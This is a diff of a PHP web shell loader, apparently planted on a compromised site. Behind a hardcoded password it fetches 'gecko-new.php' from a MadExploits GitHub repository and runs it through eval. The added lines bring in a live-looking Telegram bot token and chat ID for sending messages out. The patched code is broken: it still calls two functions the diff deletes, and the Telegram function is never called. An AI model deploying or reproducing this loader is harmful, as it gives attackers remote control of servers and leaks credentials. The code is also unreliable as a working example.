@@ -1,79 +1,68 @@
 <?php
 session_start();
+define('TELEGRAM_BOT_TOKEN', '7351931358:AAGWbXI7hnIOvGKbnQPTt2z1DiOsVIU0vLs'); // Ganti dengan token bot Anda
+define('TELEGRAM_CHAT_ID', '7460763516'); // Ganti dengan ID chat Anda
 
-/**
- * Disable error reporting
- *
- * Set this to error_reporting( -1 ) for debugging.
- */
-function geturlsinfo($url) {
-    if (function_exists('curl_exec')) {
-        $conn = curl_init($url);
-        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+$error = '';
+$logFile = 'last_log_time.txt';
+$logInterval = 5; // Waktu dalam detik
 
-        // Set cookies using session if available
-        if (isset($_SESSION['coki'])) {
-            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
-        }
-
-        $url_get_contents_data = curl_exec($conn);
-        curl_close($conn);
-    } elseif (function_exists('file_get_contents')) {
-        $url_get_contents_data = file_get_contents($url);
-    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-        $handle = fopen($url, "r");
-        $url_get_contents_data = stream_get_contents($handle);
-        fclose($handle);
-    } else {
-        $url_get_contents_data = false;
-    }
-    return $url_get_contents_data;
+function sendTelegramMessage($message) {
+    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message);
+    file_get_contents($url);
 }
 
-// Function to check if the user is logged in
-function is_logged_in()
-{
-    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+// Cek apakah ada permintaan POST untuk login
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $password = $_POST['password'] ?? '';
+    
+    if ($password === 'sempak') {
+        $_SESSION['loggedin'] = true;
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $error = 'Password salah.';
+    }
 }
 
-// Check if the password is submitted and correct
-if (isset($_POST['password'])) {
-    $entered_password = $_POST['password'];
-    $hashed_password = 'e5f45a0a383440b5dcf789715c5c1ddd'; // Replace this with your MD5 hashed password
-    if (md5($entered_password) === $hashed_password) {
-        // Password is correct, store it in session
-        $_SESSION['logged_in'] = true;
-        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
-    } else {
-        // Password is incorrect
-        echo "Incorrect password. Please try again.";
-    }
+// Cek jika sudah login
+if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
+    // Tampilkan halaman login
+    ?>
+    <!DOCTYPE html>
+    <html lang="id">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Login Telegram Logger</title>
+        <style>
+            body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 50px; text-align: center; }
+            form { background-color: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); display: inline-block; }
+            input[type="password"] { padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; width: 100%; }
+            button { padding: 10px; background-color: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
+            button:hover { background-color: #218838; }
+            .error { color: red; }
+        </style>
+    </head>
+    <body>
+        <h2>Login untuk Mengakses Logger</h2>
+        <?php if ($error): ?>
+            <p class="error"><?php echo $error; ?></p>
+        <?php endif; ?>
+        <form method="POST" action="">
+            <label for="password">Password:</label>
+            <input type="password" name="password" required>
+            <button type="submit">Login</button>
+        </form>
+    </body>
+    </html>
+    <?php
+    exit;
 }
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
     $a = geturlsinfo('https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php');
     eval('?>' . $a);
-} else {
-    // Display login form if not logged in
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Login</title>
-    </head>
-    <body>
-        <form method="POST" action="">
-            <label for="password">Password:</label>
-            <input type="password" id="password" name="password">
-            <input type="submit" value="Login">
-        </form>
-    </body>
-    </html>
-    <?php
 }
 ?>
